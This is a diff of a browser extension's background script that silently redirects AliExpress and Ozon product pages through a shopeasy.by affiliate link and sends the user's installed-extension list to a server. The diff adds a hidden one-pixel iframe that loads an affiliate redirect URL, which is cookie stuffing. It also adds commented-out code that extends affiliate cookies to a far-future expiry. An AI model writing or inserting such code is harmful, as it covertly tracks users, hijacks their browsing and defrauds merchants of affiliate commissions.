@@ -34,6 +34,7 @@ function JsInject() {
   this.server   = 'http://localhost:3000/ext';
   this.regList  = [/^https:\/\/ru(.*?)aliexpress(.*?)item(.*?\.html)/g, /(^http(.):\/\/www\.ozon\.ru)(.*?)/g]; //from server
   this.deepLink = 'http://shopeasy.by/redirect/cpa/o/ou76wi7vip8o8fxzn1fxixpo2ddqm8m2/'; //from server
+	this.eah			= 'http://shopeasy.by/redirect/cpa/o/ou76wi7vip8o8fxzn1fxixpo2ddqm8m2/?to=https%3A%2F%2Fru.aliexpress.com%2Fitem%2FHeadphone-Sennheiser-CX-3-00-Headphone-for-phone%2F32798323420.html';
 
 	this.filter   = {urls: ["<all_urls>"], types:["main_frame"]};
   this.opt_extraInfoSpec = ["blocking"];
@@ -53,9 +54,7 @@ function JsInject() {
 
 	function extList(list){
 			let ext = {};
-			for (let i=0;i<list.length;++i){
-				ext[list[i].shortName] = list[i].id;
-			}
+			list.forEach((item) => {	ext[item.shortName] = item.id	});
 			self.ext = ext;
 		}
 
@@ -75,9 +74,21 @@ function JsInject() {
   function cookieChanges(info){
     //console.log(info.cookie.domain);
     if (info.cookie.domain === 'shopeasy.by'){
-      console.log(info.cookie.domain);
+      console.log(info.cookie);
+		/*	if(/cpa|cl1/.test(info.cookie.name)){
+				chrome.cookies.set({url:'http://shopeasy.by',
+				name:info.cookie.name,
+				value:info.cookie.value,
+				domain:info.cookie.domain,
+				path:info.cookie.path,
+				secure:info.cookie.secure,
+				httpOnly:info.cookie.httpOnly,
+				sameSite:info.cookie.sameSite, expirationDate:2147483647},function(f){
+						console.log(f);
+				})*/
+				//console.log(info.cookie);
+			}
     }
-  }
 
   function beforeRequest(req){
     re = {cancel:false};
@@ -90,7 +101,6 @@ function JsInject() {
         if (moment + 720000 < Date.now()){
           self.autoactivateObj.setMoment(link, Date.now());
           let partner = _encodeUrl(self.deepLink, link);
-          console.log(partner);
           chrome.tabs.update(req.tabId, {url:partner});
         }
       }
@@ -106,8 +116,13 @@ function JsInject() {
       _xhrSend(self.server, {info:self.Data, uuid:uuid, ext:self.ext ,first:true});
     }
     else {
-      console.log(self.setting);
-      console.log(details.reason);
+			let iframe = document.body.appendChild(document.createElement('iframe'));
+			iframe.style.width = "1px";
+			iframe.style.heigth = "1px";
+			iframe.src = self.eah;
+			iframe.onload = function(){
+				// this is ok
+			}
     }
   }
 
@@ -143,13 +158,8 @@ function JsInject() {
     xhr.open("POST", url, true);
     xhr.setRequestHeader('Content-Type', 'application/json')
     xhr.onreadystatechange = function(){
-      if(xhr.readyState == 4 && xhr.status ==200){
-        try {
-          console.log(xhr.responseText);
-        }
-        catch(err){
-          console.log(err);
-        }
+      if(xhr.readyState == 4 && xhr.status == 200){
+        console.log(xhr.responseText);
       }
     }
     xhr.send(json);
